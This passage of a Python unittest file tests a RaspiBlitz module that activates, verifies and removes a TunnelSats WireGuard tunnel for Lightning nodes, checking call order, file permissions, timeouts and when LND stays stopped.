        # or REPAIR holds the lock: the lock lives in its own root 0700 directory
        shutil.rmtree(self.path("run/tunnelsats"))
        with mod.Lock(self.deps, wait=0):
            shutil.rmtree(self.path("run/tunnelsats"), ignore_errors=True)
            with self.assertRaises(mod.ModuleError) as caught:
                with mod.Lock(self.deps, wait=0):
                    pass
            self.assertEqual("E_BUSY", caught.exception.code)
        self.assertFalse(os.path.exists(self.path("run/tunnelsats")))
        self.assertEqual(0o700, os.stat(self.path("run/tunnelsats-rb")).st_mode & 0o777)


API_URL = "https://tunnelsats.com/api/public/v1/subscription/status"


# ------------------------------------------------------------------------------------------
# detect and import (activation)
# ------------------------------------------------------------------------------------------

class TestDetect(ModuleTestCase):
    def test_eligible_node(self):
        doc = self.run_verb("detect")
        self.assertEqual(0, doc["exit_code"])
        self.assertTrue(doc["eligible"])
        self.assertEqual("lnd", doc["impl"])
        self.assertEqual("none", doc["existing_install"]["kind"])
        self.assertEqual({"wireguard_tools": "present", "nft": "present", "systemd": "present",
                          "cgroup_v2": "mounted"}, doc["capabilities"])

    def test_not_eligible_reasons(self):
        self.fake.conf_set("runBehindTor", "off")
        self.fake.conf_set("lndPort", "9736")
        self.fake.its["audit lnd"] = (0, {"status": "clean", "eligible": False, "not_eligible_reason": "nat"})
        self.fake.its["detect"] = (0, fixture_json("tool", "detect_legacy.json"))
        doc = self.run_verb("detect")
        self.assertEqual(3, doc["exit_code"])
        self.assertEqual(["tor_required", "lnd_port", "not_eligible:nat", "legacy_install"], doc["reasons"])
        self.assertTrue(doc["adopt_available"])

    def test_lnd_and_cl_on_tunnels_lnd_and_refuses_cl(self):
        self.fake.conf_set("cl", "on")
        self.assertEqual("lnd", self.run_verb("detect")["impl"])
        doc = self.run_verb("import", "--file", self.import_file, "--impl", "cl")
        self.assertEqual(14, doc["exit_code"])
        self.assertEqual("E_PORT_CONFLICT", doc["errors"][0]["code"])


class TestImport(ModuleTestCase):
    def test_activation_order_and_custody(self):
        self.fake.units["lnd.service"]["ActiveState"] = "inactive"
        doc = self.run_verb("import", "--file", self.import_file)
        self.assertIn(doc["exit_code"], (0, 4, 5))
        self.assertEqual("confirmed", doc["sync"]["outcome"])
        self.assertEqual(ALICE_PUB, doc["public_key"])
        f = self.fake
        check = f.index_of(mod.ITS, "block-insert", "--check")
        flag_on = f.calls.index([mod.BLITZ_CONF, "set", "tunnelsats", "on"])
        impl_set = f.calls.index([mod.BLITZ_CONF, "set", "tunnelsatsImpl", "lnd"])
        install = f.index_of(mod.ITS, "install")
        block = f.calls.index([mod.ITS, "block-insert", "--json"])
        timer = f.calls.index([mod.ITS, "tick-timer", "on"])
        self.assertLess(f.index_of(mod.ITS, "fetch"), check)
        self.assertTrue(check < impl_set < flag_on < install < block < timer)
        self.assertEqual([mod.ITS, "install", "--impl", "lnd", "--json"], f.calls[install])
        self.assertEqual([], f.calls_of("systemctl", "start"))
        self.assertEqual([], f.calls_of("systemctl", "restart"))
        self.assertEqual({"fetch": "ok", "unit_regenerated": False, "install": "ok", "ln_restarted": True,
                          "restore_block": "present", "tick_timer": "active"}, doc["activation"])
        self.assertEqual(0o600, os.stat(self.path(mod.CONF_FILE)).st_mode & 0o777)
        self.assertEqual(0o600, os.stat(self.path(mod.STATE_FILE)).st_mode & 0o777)
        self.assertEqual(0o700, os.stat(self.path(mod.STATE_DIR)).st_mode & 0o777)
        self.assertEqual(fixture("import", "website.golden.conf", mode="rb"), self.read_bytes(mod.CONF_FILE))
        state = self.read_json(mod.STATE_FILE)
        self.assertEqual(("managed", "lnd", ALICE_PUB, 24556), (state["mode"], state["impl"], state["public_key"],
                                                                state["vpn_port"]))
        self.assertNotIn(ALICE_PRIV, json.dumps(state))
        timeouts = {argv[1]: t for argv, t in f.timeouts if argv[0] == mod.ITS}
        self.assertEqual([mod.ITS_TIMEOUT[verb] for verb in ("fetch", "detect", "install")],
                         [timeouts[verb] for verb in ("fetch", "detect", "install")])

    def test_guard_less_unit_is_regenerated_before_the_flag(self):
        self.write("etc/systemd/system/lnd.service", "[Service]\nExecStart=/usr/local/bin/lnd\n")
        doc = self.run_verb("import", "--file", self.import_file)
        self.assertTrue(doc["activation"]["unit_regenerated"])
        regen = self.fake.calls.index(["install", "-m", "0644", mod.LND_ASSET, "/etc/systemd/system/lnd.service"])
        reload_ = self.fake.calls.index(["systemctl", "daemon-reload"])
        flag_on = self.fake.calls.index([mod.BLITZ_CONF, "set", "tunnelsats", "on"])
        self.assertTrue(regen < reload_ < flag_on)

    def test_failed_install_switches_the_flag_off_and_keeps_the_config(self):
        self.fake.its["install"] = (6, fixture_json("tool", "install_capability.json"))
        doc = self.run_verb("import", "--file", self.import_file)
        self.assertEqual(3, doc["exit_code"])
        self.assertEqual("E_CAPABILITY_MISSING", doc["errors"][0]["code"])
        install = self.fake.index_of(mod.ITS, "install")
        self.assertEqual([mod.BLITZ_CONF, "set", "tunnelsats", "off"], self.fake.calls[install + 1])
        self.assertEqual("off", mod.read_rb_conf(self.deps)["tunnelsats"])
        self.assertTrue(os.path.exists(self.path(mod.CONF_FILE)))
        self.assertEqual(-1, self.fake.index_of(mod.ITS, "block-insert", "--json"))
        refused = (7, fixture_json("tool", "install_managed_present.json"))
        self.fake.its["install"] = refused
        self.assertEqual(14, self.run_verb("import", "--file", self.import_file)["exit_code"])

    def test_unknown_key_stores_nothing(self):
        self.fake.http_responses = [(404, {}, fixture("api", "error_not_found.json").encode())]
        doc = self.run_verb("import", "--file", self.import_file)
        self.assertEqual((14, "E_UNKNOWN_KEY"), (doc["exit_code"], doc["errors"][0]["code"]))
        self.assertFalse(os.path.exists(self.path(mod.STATE_DIR)))
        self.assertEqual([], self.fake.calls_of(mod.BLITZ_CONF))

    def test_api_failure_needs_confirmation(self):
        self.fake.http_responses = [OSError("down")]
        doc = self.run_verb("import", "--file", self.import_file)
        self.assertEqual((13, "E_API_UNAVAILABLE"), (doc["exit_code"], doc["errors"][0]["code"]))
        self.assertFalse(os.path.exists(self.path(mod.CONF_FILE)))
        self.fake.http_responses = [OSError("down")]
        doc = self.run_verb("import", "--file", self.import_file, "--yes")
        self.assertEqual("failed", doc["sync"]["outcome"])
        self.assertTrue(os.path.exists(self.path(mod.CONF_FILE)))

    def test_dry_run_writes_nothing(self):
        doc = self.run_verb("import", "--file", self.import_file, "--dry-run")
        self.assertEqual(0, doc["exit_code"])
        self.assertTrue(doc["valid"] and doc["dry_run"] and doc["public_key_matches"])
        self.assertEqual("confirmed", doc["sync"]["outcome"])
        self.assertFalse(os.path.exists(self.path(mod.STATE_FILE)))
        self.assertEqual([], self.fake.calls_of(mod.BLITZ_CONF))
        self.assertEqual(-1, self.fake.index_of(mod.ITS, "install"))

    def test_another_stored_key_is_refused_and_ineligible_nodes_stop_early(self):
        self.store()
        text = fixture("import", "website.conf").replace(ALICE_PRIV, "4Ll6wDUceJ98qxImrs3HduHQu0bNxERCWnImQhhWCWs=")
        other = self.write("other.conf", text)
        doc = self.run_verb("import", "--file", other)
        self.assertEqual((14, "E_ALREADY_CONFIGURED"), (doc["exit_code"], doc["errors"][0]["code"]))
        shutil.rmtree(self.path(mod.STATE_DIR))
        self.fake.conf_set("runBehindTor", "off")
        doc = self.run_verb("import", "--file", self.import_file)
        self.assertEqual((3, "E_NOT_ELIGIBLE"), (doc["exit_code"], doc["errors"][0]["code"]))
        self.assertEqual([], self.fake.http_calls)

    def test_invalid_file_names_no_values(self):
        bad = self.write("bad.conf", fixture("import", "website.conf").replace("# Port Forwarding: 24556\n", ""))
        doc = self.run_verb("import", "--file", bad)
        self.assertEqual((2, "E_CONFIG_NO_PORT"), (doc["exit_code"], doc["errors"][0]["code"]))
        doc = self.run_verb("import", "--file", self.path("missing.conf"))
        self.assertEqual((2, "E_FILE"), (doc["exit_code"], doc["errors"][0]["code"]))

    # -- the check after the activation waits until the restarted Lightning unit has started --
    def test_the_check_waits_until_lightning_has_started(self):
        # the tool's install restarts LND, which stays activating until it is ready (Type=notify)
        self.record()
        self.starts_after_install(3)
        doc = self.run_verb("import", "--file", self.import_file)
        self.assertEqual((0, "protected"), (doc["exit_code"], doc["verdict"]), doc)
        self.assertEqual({"unit": "lnd.service", "state": "active", "waited_s": 9, "outcome": "active"},
                         doc["ln_start_wait"])
        self.assertEqual([mod.LN_START_STEP] * 3, self.start_steps())
        self.assertNotIn("ln_start", doc["check"]["reasons"])

    def test_a_start_that_does_not_finish_is_reported_never_passed(self):
        self.record()
        self.starts_after_install(1000)
        doc = self.run_verb("import", "--file", self.import_file)
        self.assertEqual((5, "degraded"), (doc["exit_code"], doc["verdict"]), doc)
        self.assertEqual({"unit": "lnd.service", "state": "activating", "waited_s": mod.LN_START_WAIT,
                          "outcome": "timeout"}, doc["ln_start_wait"])
        self.assertEqual(mod.LN_START_WAIT // mod.LN_START_STEP, len(self.start_steps()))
        self.assertIn("ln_start", doc["check"]["reasons"])
        self.assertIn("still starting after %d s" % mod.LN_START_WAIT, mod.result_text(doc) + json.dumps(doc))

    def test_lightning_that_was_stopped_is_not_waited_for(self):
        self.fake.units["lnd.service"]["ActiveState"] = "inactive"
        doc = self.run_verb("import", "--file", self.import_file)
        self.assertEqual({"unit": "lnd.service", "state": "inactive", "waited_s": 0, "outcome": "not_running"},
                         doc["ln_start_wait"])
        self.assertEqual([], self.start_steps())

    @staticmethod
    def verify_no_handshake_yet(extra_fail=None):
        doc = fixture_json("verify", "protected.json")
        doc.update({"exit_code": 5, "verdict": "degraded"})
        for c in doc["checks"]:
            if c["id"] == "wg_handshake":
                c.update({"result": "fail", "detail": "no handshake yet"})
        if extra_fail:
            doc["checks"].append(extra_fail)
        return 5, doc

    def test_first_handshake_completing_during_the_probe_wait_gives_protected(self):
        # Tunnelsats/raspiblitz#5: verify checks wg_handshake before probe_tunnel initiates the
        # first handshake; when "no handshake yet" is the only failing check, wait briefly and re-check
        self.record()
        self.fake.its["verify"] = [self.verify_no_handshake_yet(),
                                   self.verify_no_handshake_yet(),
                                   (0, fixture_json("verify", "protected.json"))]
        doc = self.run_verb("import", "--file", self.import_file)
        self.assertEqual((0, "protected"), (doc["exit_code"], doc["verdict"]), doc)
        self.assertEqual([], doc["check"]["reasons"])
        self.assertEqual([mod.HANDSHAKE_STEP] * 2, self.fake.sleeps)

    def test_no_handshake_at_the_limit_reports_degraded_wg_handshake(self):
        self.record()
        self.fake.its["verify"] = self.verify_no_handshake_yet()
        doc = self.run_verb("import", "--file", self.import_file)
        self.assertEqual((5, "degraded"), (doc["exit_code"], doc["verdict"]), doc)
        self.assertEqual(["wg_handshake"], doc["check"]["reasons"])
        self.assertEqual([mod.HANDSHAKE_STEP] * (mod.HANDSHAKE_WAIT // mod.HANDSHAKE_STEP), self.fake.sleeps)

    def test_another_failing_check_does_not_wait_for_handshake(self):
        self.record()
        self.fake.its["verify"] = self.verify_no_handshake_yet(
            {"id": "probe_tunnel", "class": "degraded", "result": "fail", "detail": "probe timed out"})
        doc = self.run_verb("import", "--file", self.import_file)
        self.assertEqual((5, "degraded"), (doc["exit_code"], doc["verdict"]), doc)
        self.assertEqual(["wg_handshake", "probe_tunnel"], doc["check"]["reasons"])
        self.assertEqual([], self.fake.sleeps)


# ------------------------------------------------------------------------------------------
# REMOVE, ADOPT, REPAIR
# ------------------------------------------------------------------------------------------

class TestRunCommand(unittest.TestCase):
    """The production run_command on real processes (no network)."""

    def setUp(self):
        self.dir = tempfile.mkdtemp(prefix="ts-run-")

    def tearDown(self):
        shutil.rmtree(self.dir, ignore_errors=True)

    def test_a_timeout_stops_the_whole_process_group_and_lets_traps_clean_up(self):
        script = os.path.join(self.dir, "slow.sh")
        with open(script, "w") as handle:
            handle.write('#!/bin/bash\ntrap \'echo cleaned > "$1/trap"; exit 143\' TERM\n'
                         'sleep 30 &\necho $! > "$1/child"\nwait\n')
        started = time.monotonic()
        self.assertEqual((124, "", "timeout"), mod.run_command(["bash", script, self.dir], timeout=1))
        self.assertLess(time.monotonic() - started, 10)
        with open(os.path.join(self.dir, "trap")) as handle:
            self.assertEqual("cleaned\n", handle.read())
        with open(os.path.join(self.dir, "child")) as handle:
            child = int(handle.read())
        for _ in range(50):
            try:
                os.kill(child, 0)
            except ProcessLookupError:
                break
            time.sleep(0.1)
        else:
            self.fail("the child of the timed-out command still runs")

    def test_output_exit_code_and_a_missing_program(self):
        self.assertEqual((3, "out\n", "err\n"), mod.run_command(["sh", "-c", "echo out; echo err >&2; exit 3"]))
        self.assertEqual(127, mod.run_command([os.path.join(self.dir, "missing")])[0])

    def test_timeouts_cover_the_script_worst_cases(self):
        with open(ITS_PATH) as handle:
            text = handle.read()
        budget = int(re.search(r'TS_RB_FETCH_BUDGET="\$\{TS_RB_FETCH_BUDGET:-([0-9]+)\}"', text).group(1))
        verify_timeout = int(re.search(r'TS_RB_VERIFY_TIMEOUT="\$\{TS_RB_VERIFY_TIMEOUT:-([0-9]+)\}"', text).group(1))

        def tool(verb):   # timeout and kill-after of the pinned tool's verb in the script
            m = re.search(r'its_tool_out "\$json" %s "[^"]+" "[^"]+" "?([0-9]+|\$t)"? %s' % (verb, verb), text)
            return int(m.group(1)) if m and m.group(1).isdigit() else None

        t = mod.ITS_TIMEOUT
        self.assertGreater(t["fetch"], budget + 10)
        self.assertGreater(t["detect"], budget + 10 + tool("detect") + 10)
        self.assertGreater(t["install"], tool("install") + 10)
        self.assertGreater(t["adopt"], tool("adopt") + 10)
        self.assertGreater(t["uninstall"], tool("uninstall") + 10)
        self.assertGreater(t["verify"], 120 + 10)
        self.assertGreater(t["verify_no_probe"], 35 + 10)
        self.assertGreater(t["status"], verify_timeout + 5)
        self.assertGreater(t["guard_dry_run"], verify_timeout + 5)
        self.assertIn('timeout --kill-after=5 "$t" git', text)
        self.assertNotIn("timeout 120 git", text)


class TestTemplates(unittest.TestCase):
    def test_guard_line_is_the_line_the_unit_templates_write(self):
        with open(os.path.join(REPO, "home.admin", "assets", "lnd.service")) as handle:
            self.assertIn(mod.guard_line("lnd"), handle.read().splitlines())
        with open(os.path.join(REPO, "home.admin", "config.scripts", "cl.install-service.sh")) as handle:
            lines = [line for line in handle.read().splitlines() if line.startswith("ExecStartPre=+")]
        self.assertEqual(1, len(lines))
        rendered = lines[0].replace("$CHAIN", "mainnet").replace("${netprefix}", "")
        # nothing else in the line for bash (echo "...") or systemd to expand
        self.assertFalse(any(ch in rendered for ch in "$%\\`"), rendered)
        self.assertEqual(mod.guard_line("cl"), rendered)
        for impl in mod.IMPLS:
            self.assertIn("if [ -x %s ]; then exec %s guard %s mainnet; fi;" % (mod.ITS, mod.ITS, impl),
                          mod.guard_line(impl))
            self.assertTrue(mod.guard_line(impl).endswith(
                "echo %s= > /run/tunnelsats/hybrid-%s.env'" % (mod.VARS[impl], mod.BASES[impl])))


class TestRemove(ModuleTestCase):
    def setUp(self):
        super().setUp()
        self.store()
        self.activate_conf()
        self.fake.its["detect"] = [(0, fixture_json("tool", "detect_managed.json")),
                                   (0, fixture_json("tool", "detect_none.json"))]
        self.fake.its["block-status"] = (0, {"state": "absent"})
        self.write("run/tunnelsats/hybrid-lnd.env", "TUNNELSATS_LND_ARGS=%s\n" % " ".join(LND_FLAGS))
        # after the restart REMOVE triggers: outside the slice, without flags
        self.fake.units["lnd.service"]["ControlGroup"] = "/system.slice/lnd.service"
        self.cmdline(4242, ["/usr/local/bin/lnd", "--configfile=/mnt/hdd/app-data/lnd/lnd.conf"])

    def test_disabled_unit_is_reenabled_and_started_after_the_own_audit(self):
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual(0, doc["exit_code"], doc)
        self.assertTrue(doc["removed"] and doc["ln_reenabled"] and doc["ln_started"] and doc["ln_was_active"])
        f = self.fake
        off = f.calls.index([mod.BLITZ_CONF, "set", "tunnelsats", "off"])
        uninstall = f.calls.index([mod.ITS, "uninstall", "--json"])
        audit = f.calls.index([mod.ITS, "audit", "lnd", "--repair", "--json"])
        enable = f.calls.index(["systemctl", "enable", "lnd.service"])
        start = f.calls.index(["systemctl", "start", "lnd.service"])
        self.assertTrue(off < f.calls.index([mod.ITS, "block-remove", "--json"]) < uninstall < audit < enable < start)
        self.assertIn([mod.ITS, "tick-timer", "off"], f.calls)
        self.assertFalse(os.path.exists(self.path("run/tunnelsats/hybrid-lnd.env")))
        self.assertEqual([], doc["artifacts"])
        self.assertTrue(os.path.exists(self.path(mod.CONF_FILE)))

    def test_incomplete_removal_keeps_lightning_stopped(self):
        self.fake.its["uninstall"] = (1, fixture_json("tool", "uninstall_incomplete.json"))
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual(1, doc["exit_code"])
        self.assertEqual(["nft table inet tunnelsats"], doc["remaining"])
        self.assertEqual([], self.fake.calls_of("systemctl", "enable"))
        self.assertEqual([], self.fake.calls_of("systemctl", "start"))

    @staticmethod
    def audit(status, reason=None, lines=(), keys=()):
        return {"contract": 1, "command": "its.audit", "status": status, "reason": reason, "keys": list(keys),
                "lines": list(lines), "eligible": True}

    def assert_stays_stopped(self, doc):
        self.assertEqual((1, "E_AT_REST_UNREPAIRABLE"), (doc["exit_code"], doc["errors"][0]["code"]), doc)
        self.assertEqual([], self.fake.calls_of("systemctl", "enable"))
        self.assertEqual([], self.fake.calls_of("systemctl", "start"))
        self.assertFalse(doc["removed"] or doc["ln_reenabled"] or doc["ln_started"])

    def test_unrepairable_at_rest_audit_keeps_lightning_stopped_and_names_the_lines(self):
        line = "/mnt/hdd/app-data/lnd/lnd.conf:8:externalhosts=de2.tunnelsats.com:24556"
        self.fake.its["audit lnd --repair"] = (1, self.audit("unrepairable", "backup_failed", [line], ["externalhosts"]))
        doc = self.run_verb("uninstall", "--yes")
        self.assert_stays_stopped(doc)
        action = doc["action_required"]
        self.assertEqual(("node_config_clearnet", [line], "systemctl enable --now lnd.service"),
                         (action["reason"], action["lines"], action["then"]))
        self.assertIn("backup_failed", action["detail"])
        self.assertIn("lnd.service stays stopped and disabled", doc["errors"][0]["message"])
        self.assertIn("then run: sudo systemctl enable --now lnd.service", doc["errors"][0]["message"])
        text = mod.result_text(doc)
        self.assertIn(line, text)
        self.assertIn("Then run: sudo systemctl enable --now lnd.service", text)
        self.assertTrue(os.path.exists(self.path(mod.CONF_FILE)))

    def test_an_at_rest_audit_without_answer_keeps_lightning_stopped(self):
        self.fake.its["audit lnd --repair"] = (124, "")
        doc = self.run_verb("uninstall", "--yes")
        self.assert_stays_stopped(doc)
        self.assertIsNone(doc["at_rest"])
        self.assertEqual(("node_config_unknown", []), (doc["action_required"]["reason"], doc["action_required"]["lines"]))
        self.assertIn("did not answer", doc["action_required"]["detail"])

    def test_a_running_unit_gets_the_read_only_check_and_is_stopped_and_disabled(self):
        uninstall = fixture_json("tool", "uninstall_disabled.json")
        uninstall.update({"ln_disabled": False, "ln_started": True, "node_config": "clean", "action_required": None})
        self.fake.its["uninstall"] = (0, uninstall)
        self.fake.its["audit lnd --repair"] = (1, self.audit("not_checked"))
        line = "/mnt/hdd/app-data/lnd/lnd.conf:27:tor.skip-proxy-for-clearnet-targets=true"
        # Tor-only when checked before the tool, no longer when audited after it
        self.fake.its["audit lnd"] = [(0, self.audit("clean")),
                                      (4, self.audit("drift", None, [line], ["tor.skip-proxy-for-clearnet-targets"]))]
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((1, "E_AT_REST_UNREPAIRABLE", "drift", False),
                         (doc["exit_code"], doc["errors"][0]["code"], doc["at_rest"], doc["ln_stopped_first"]), doc)
        self.assertEqual(([line], "systemctl enable --now lnd.service"),
                         (doc["action_required"]["lines"], doc["action_required"]["then"]))
        self.assertIn([mod.ITS, "audit", "lnd", "--json"], self.fake.calls)
        # with TunnelSats off and the tunnel gone, nothing may run or start it with that config
        f = self.fake
        self.assertLess(f.calls.index(["systemctl", "stop", "lnd.service"]), f.calls.index(["systemctl", "disable", "lnd.service"]))
        self.assertEqual([], f.calls_of("systemctl", "enable") + f.calls_of("systemctl", "start"))
        self.assertEqual({"ActiveState": "inactive", "UnitFileState": "disabled"}, self.unit_state())
        self.assertFalse(doc["ln_started"])
        self.assertIn("lnd.service stays stopped and disabled", doc["errors"][0]["message"])
        self.assertEqual({"unit": "lnd.service", "ln_was_active": True, "ln_disabled": True}, self.pending())

    def test_a_running_unit_with_a_clean_config_completes(self):
        uninstall = fixture_json("tool", "uninstall_disabled.json")
        uninstall.update({"ln_disabled": False, "ln_started": True, "node_config": "clean", "action_required": None})
        self.fake.its["uninstall"] = (0, uninstall)
        self.fake.its["audit lnd --repair"] = (1, self.audit("not_checked"))
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((0, "clean", True), (doc["exit_code"], doc["at_rest"], doc["removed"]), doc)
        self.assertEqual([], self.fake.calls_of("systemctl", "enable") + self.fake.calls_of("systemctl", "start"))

    # -- uninstall --managed of the pinned tool: it reads the start guard's variable through -----
    def tool_restarts_lnd(self):
        """REMOVE deleted the guard's env file, so the pinned tool finds lnd.conf clean: it starts LND
        again itself (outside the slice, Tor-only), never disables the unit, and takes the former VPN
        address out of LND's node announcement."""
        self.fake.its["uninstall"] = (0, fixture_json("tool", "uninstall_clean.json"))
        self.fake.its["audit lnd --repair"] = (1, self.audit("not_checked"))

    def test_the_tool_starts_lnd_again_and_remove_does_not_enable_or_start_it(self):
        self.tool_restarts_lnd()
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((0, True, "clean", "clean"), (doc["exit_code"], doc["removed"], doc["node_config"], doc["at_rest"]), doc)
        self.assertEqual({"ln_was_active": True, "ln_started": True, "ln_reenabled": False},
                         {key: doc[key] for key in ("ln_was_active", "ln_started", "ln_reenabled")})
        self.assertEqual([], self.fake.calls_of("systemctl", "enable") + self.fake.calls_of("systemctl", "start"))
        self.assertEqual("removed", doc["tool_announce_cleanup"])
        self.assertNotIn("remove_pending", mod.load_state(self.deps))

    def test_an_address_the_tool_took_out_already_leaves_announce_cleanup_none(self):
        # REMOVE still checks LND's announcement itself (defence in depth) and finds nothing left
        self.tool_restarts_lnd()
        self.record(ipv4="1.2.3.4")
        self.fake.getinfo["uris"] = ["0280a@exampleonion.onion:9735"]
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((0, True, "none", "removed", []),
                         (doc["exit_code"], doc["removed"], doc["announce_cleanup"], doc["tool_announce_cleanup"],
                          doc["warnings"]), doc)
        self.assertEqual([], doc["errors"])
        self.assertEqual([], [c for c in self.fake.calls if "updatenodeannouncement" in c])

    def test_the_tools_announcement_result_and_warnings_are_kept_apart_from_removes_own(self):
        # the tool kept LND stopped (TunnelSats settings in lnd.conf) and named the command; REMOVE's
        # own audit repaired the config, started LND and took the address out itself
        self.record(ipv4="1.2.3.4")
        doc = self.run_verb("uninstall", "--yes")
        tool = fixture_json("tool", "uninstall_disabled.json")
        self.assertEqual((0, "removed", "skipped"), (doc["exit_code"], doc["announce_cleanup"], doc["tool_announce_cleanup"]), doc)
        self.assertEqual(tool["warnings"], doc["tool_warnings"])
        self.assertEqual([], doc["warnings"])
        self.assertNotIn("does not run", mod.result_text(doc))

    def test_a_tool_without_the_announcement_fields_leaves_them_empty(self):
        # a report without announce_cleanup and warnings (as tools before tunnelsats PR 230 wrote it)
        uninstall = fixture_json("tool", "uninstall_disabled.json")
        for key in ("announce_cleanup", "warnings"):
            del uninstall[key]
        self.fake.its["uninstall"] = (0, uninstall)
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((0, True, None, []), (doc["exit_code"], doc["removed"], doc["tool_announce_cleanup"], doc["tool_warnings"]), doc)

    # -- a running unit whose config is not Tor-only at rest: REMOVE stops it before the tool ----
    def fresh(self):
        """A new fixture tree and fake, as for a new test."""
        self.tearDown()
        self.setUp()

    def real_audit(self):
        """The at-rest audit is internet.tunnelsats.sh audit itself, read-only and --repair, on this
        tree's lnd.conf and CLN config, with the unit state of the fake systemd."""
        fake = self.fake
        script = ('source "$ITS"; TS_RB_CONF="$R/mnt/hdd/app-data/raspiblitz.conf"; '
                  'TS_RB_APPDATA="$R/mnt/hdd/app-data"; TS_RB_CLN_DIR="$R/cln"; '
                  'TS_RB_SYSTEMCTL="$R/systemctl-show"; TS_RB_ROOT_UID="$(id -u)"; its_cmd_audit "$@"')

        def audit(impl, *extra):
            def answer():
                self.write("systemctl-show", "#!/bin/sh\necho %s\n" % fake.units[mod.UNITS[impl]]["ActiveState"])
                os.chmod(self.path("systemctl-show"), 0o755)
                proc = subprocess.run(["bash", "-c", script, "_", impl] + list(extra) + ["--json"],
                                      capture_output=True, text=True, timeout=60, check=False,
                                      env=dict(os.environ, ITS=ITS_PATH, R=self.root, LC_ALL="C"))
                return proc.returncode, proc.stdout
            return answer
        for impl in mod.IMPLS:
            fake.its["audit %s" % impl] = audit(impl)
            fake.its["audit %s --repair" % impl] = audit(impl, "--repair")

    def pinned_tool(self, unit="lnd.service", clean=True, disable_fails=False):
        """uninstall --managed as the pinned tool runs it: it stops a running unit and removes the
        dataplane. It starts the unit again only if it ran when the tool began and the tool's own check
        finds no TunnelSats clearnet settings (clean: for LND no externalhosts with a value and no
        tor.skip-proxy-for-clearnet-targets); with such settings it keeps the unit stopped and disables
        it, or reports E_LN_DISABLE (exit 1) when the disable fails (disable_fails). self.tool_found
        records the state in which the tool found the unit."""
        fake = self.fake
        fake.stateful = True
        self.tool_found = []

        def uninstall():
            props = fake.units[unit]
            ran = props["ActiveState"] not in ("inactive", "failed")
            self.tool_found.append(props["ActiveState"])
            doc = fixture_json("tool", "uninstall_clean.json" if clean else "uninstall_disabled.json")
            doc.update({"unit": unit, "ln_was_active": ran})
            if not clean and disable_fails:
                props["ActiveState"] = "inactive"
                doc.update({"ok": False, "exit_code": 1, "ln_disabled": False, "errors": [
                    {"code": "E_LN_DISABLE", "class": "operational",
                     "message": "%s could not be disabled (Access denied); it would start with TunnelSats clearnet "
                                "settings outside the tunnel on the next boot: run 'systemctl disable %s'" % (unit, unit)}]})
                doc["action_required"] = dict(doc["action_required"], then="systemctl disable %s" % unit)
                return 1, doc
            if not clean:
                props.update({"ActiveState": "inactive", "UnitFileState": "disabled"})
            elif not ran:
                doc.update({"ln_started": False, "announce_cleanup": "skipped",
                            "warnings": fixture_json("tool", "uninstall_disabled.json")["warnings"]})
            if unit != "lnd.service":
                doc.update({"announce_cleanup": "skipped", "warnings": []})
            return 0, doc
        fake.its["uninstall"] = uninstall

    def watch_the_stop(self, unit="lnd.service"):
        """Records remove_pending as it is when systemctl stop runs for unit."""
        self.pending_at_stop = []

        def hook(argv):
            if argv == ["systemctl", "stop", unit]:
                pending = (mod.load_state(self.deps) or {}).get("remove_pending") or {}
                self.pending_at_stop.append({key: pending.get(key) for key in ("unit", "ln_was_active", "ln_disabled")})
        self.fake.hooks.append(hook)

    def lnd_conf(self, old, new):
        path = self.path("mnt/hdd/app-data/lnd/lnd.conf")
        with open(path) as handle:
            text = handle.read()
        self.assertIn(old, text)
        with open(path, "w") as handle:
            handle.write(text.replace(old, new, 1))
        return path

    def unit_state(self, unit="lnd.service"):
        return {key: self.fake.units[unit][key] for key in ("ActiveState", "UnitFileState")}

    def assert_stopped_before_the_tool(self, doc, unit="lnd.service"):
        """Not Tor-only at the check before the tool: remove_pending first, then the stop and the
        disable, then the tool, which finds the unit stopped and so does not start it, then REMOVE's
        own audit with --repair on the stopped unit."""
        f, impl = self.fake, mod.IMPL_OF_UNIT[unit]
        check = f.calls.index([mod.ITS, "audit", impl, "--json"])
        stop = f.calls.index(["systemctl", "stop", unit])
        tool = f.calls.index([mod.ITS, "uninstall", "--json"])
        self.assertTrue(check < stop < f.calls.index(["systemctl", "disable", unit]) < tool
                        < f.calls.index([mod.ITS, "audit", impl, "--repair", "--json"]), f.calls)
        self.assertEqual([{"unit": unit, "ln_was_active": True, "ln_disabled": False}], self.pending_at_stop)
        self.assertEqual(["inactive"], self.tool_found)
        self.assertTrue(doc["ln_stopped_first"] and doc["ln_was_active"], doc)

    def assert_repaired_and_started(self, doc, unit="lnd.service"):
        self.assertEqual((0, True, "repaired"), (doc["exit_code"], doc["removed"], doc["at_rest"]), doc)
        self.assertTrue(doc["ln_reenabled"] and doc["ln_started"], doc)
        f = self.fake
        self.assertLess(f.calls.index([mod.ITS, "audit", mod.IMPL_OF_UNIT[unit], "--repair", "--json"]),
                        f.calls.index(["systemctl", "enable", unit]))
        self.assertLess(f.calls.index(["systemctl", "enable", unit]), f.calls.index(["systemctl", "start", unit]))
        self.assertEqual({"ActiveState": "active", "UnitFileState": "enabled"}, self.unit_state(unit))
        self.assertNotIn("remove_pending", mod.load_state(self.deps))

    def assert_refused_stopped_and_disabled(self, doc):
        self.assert_stays_stopped(doc)
        self.assertEqual("systemctl enable --now lnd.service", doc["action_required"]["then"])
        self.assertIn("lnd.service stays stopped and disabled", doc["errors"][0]["message"])
        self.assertEqual({"ActiveState": "inactive", "UnitFileState": "disabled"}, self.unit_state())
        self.assertEqual({"unit": "lnd.service", "ln_was_active": True, "ln_disabled": True}, self.pending())

    def test_the_normal_path_makes_the_same_calls_plus_two_read_only_ones_before_the_tool(self):
        # lnd.conf Tor-only at rest: the tool starts LND again itself, REMOVE stops, disables,
        # enables and starts nothing
        def remove():
            self.tool_restarts_lnd()
            doc = self.run_verb("uninstall", "--yes")
            self.assertEqual((0, True, False, True, False),
                             (doc["exit_code"], doc["removed"], doc["ln_stopped_first"], doc["ln_started"],
                              doc["ln_reenabled"]), doc)
            return list(self.fake.calls)
        with mock.patch.object(mod, "stop_unless_tor_only", return_value=(None, "skipped")):
            without = remove()
        self.fresh()
        calls = remove()
        check = calls.index([mod.ITS, "audit", "lnd", "--json"])
        self.assertEqual(["systemctl", "show", "-p", "ActiveState", "-p", "UnitFileState", "lnd.service"], calls[check - 1])
